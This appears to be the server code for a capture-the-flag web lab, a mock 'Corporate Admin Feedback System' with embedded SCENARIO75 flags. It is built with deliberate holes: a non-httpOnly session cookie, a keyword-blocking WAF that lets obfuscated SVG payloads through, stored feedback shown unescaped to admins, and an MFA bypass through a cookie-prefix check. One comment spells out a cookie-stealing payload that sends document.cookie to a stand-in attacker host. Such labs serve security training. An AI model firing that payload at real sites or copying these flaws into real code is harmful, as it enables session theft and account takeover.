const express = require('express');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3075;

app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// PHASE 1: Reconnaissance - Explicitly expose technology via header
app.use((req, res, next) => {
    res.setHeader('X-Powered-By', 'Node.js'); // SCENARIO75{Node.js}
    next();
});

// Mock Database for feedback
let feedbackDatabase = [];

// App routes
app.get('/', (req, res) => {
    // Session Initialization: Issue pre_mfa_session cookie if not present
    if (!req.cookies.pre_mfa_session) {
        res.cookie('pre_mfa_session', 'pending_mfa_verification', { 
            httpOnly: false, // SCENARIO75{False} - Explicitly vulnerable to XSS exfiltration
            path: '/'
        }); // SCENARIO75{pre_mfa_session}, SCENARIO75{pending_mfa_verification}
    }
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Corporate Admin Feedback System</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f6f9; }
                .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; }
                textarea { width: 100%; height: 100px; margin-bottom: 10px; }
                input[type="submit"] { background-color: #0056b3; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Admin Feedback Submission</h2>
                <p>Submit security or administrative feedback directly to system auditors.</p>
                <form action="/feedback" method="POST">
                    <textarea name="feedback" placeholder="Enter your feedback here..."></textarea>
                    <br>
                    <input type="submit" value="Submit Feedback">
                </form>
            </div>
        </body>
        </html>
    `);
});

// PHASE 1: Hidden Paths - robots.txt route
app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send("User-agent: *\nDisallow: /api/verify-mfa"); // SCENARIO75{/api/verify-mfa}
});

// Dummy endpoint for MFA mapping
app.get('/api/verify-mfa', (req, res) => {
    res.status(200).json({ message: "MFA Gateway Online" });
});

// PHASE 2: Defense Evasion - POST exclusive validation and WAF Implementation
app.post('/feedback', (req, res) => { // SCENARIO75{POST}
    const userFeedback = req.body.feedback || '';

    // Rudimentary WAF Rules
    // 1. Check for standard <script> tag
    if (/<script>/i.test(userFeedback)) {
        return res.status(403).send("Forbidden: Malicious Payload Detected by WAF."); // SCENARIO75{403}
    }

    // 2. Block standard document.cookie keyword checks
    if (userFeedback.includes("document.cookie")) {
        return res.status(403).send("Forbidden: Sensitive Object Access Blocked by WAF.");
    }

    // WAF Bypass Scenario: Allows <svg> with onload execution and bracket notation obfuscation
    // e.g., <svg onload="fetch('http://attacker.local/?c='+window['docu'+'ment']['coo'+'kie'])">
    if (/<svg/i.test(userFeedback) && userFeedback.includes("window[") && userFeedback.includes("fetch")) {
        // SCENARIO75{<svg>}, SCENARIO75{window['docu'+'ment']['coo'+'kie']}, SCENARIO75{fetch}
        feedbackDatabase.push(userFeedback); 
        return res.send("Feedback submitted successfully. An administrator will review your input shortly.");
    }

    feedbackDatabase.push(userFeedback);
    res.send("Feedback submitted successfully.");
});

// PHASE 3: Initial Access - Dashboard and MFA Bypass Logic via Cookie Reuse
app.get('/dashboard', (req, res) => { // SCENARIO75{/dashboard}
    const sessionCookie = req.cookies.admin_session || '';

    // Check if session uses the mandatory authenticated prefix adm_sess
    if (sessionCookie.startsWith('adm_sess_')) { // SCENARIO75{adm_sess}
        // CRITICAL VULNERABILITY: Valid session token existence skips the /api/verify-mfa logic completely.
        
        // Simulating the rendering of the malicious XSS payload stored in the database
        const reflectedXSS = feedbackDatabase.find(item => item.includes('<svg')) || 'No recent alerts.';

        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Administrative Dashboard</title>
                <style>
                    body { font-family: Arial, sans-serif; background-color: #1a1d20; color: #fff; padding: 40px; }
                    .dashboard-box { background: #2b3035; padding: 20px; border-radius: 5px; border-left: 5px solid #ffc107; }
                    .xss-payload { background: #111; padding: 15px; color: #00ff00; border: 1px dashed #555; font-family: monospace; }
                    .flag-box { margin-top: 20px; padding: 15px; background: #dc3545; color: white; font-weight: bold; font-size: 1.2em; border-radius: 3px; }
                </style>
            </head>
            <body>
                <div class="dashboard-box">
                    <h2>System Audit Console (Authenticated)</h2>
                    <p>Welcome back, Administrator.</p>
                    
                    <h3>Recent System Triggers:</h3>
                    <div class="xss-payload">${reflectedXSS}</div> <div class="flag-box">
                        SYSTEM COMPROMISED: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
                    </div>
                </div>
            </body>
            </html>
        `);
    } else {
        return res.status(401).send("Unauthorized: Active administrative session required or MFA verification missing.");
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Admin Feedback System listening exactly on port ${PORT}`);
});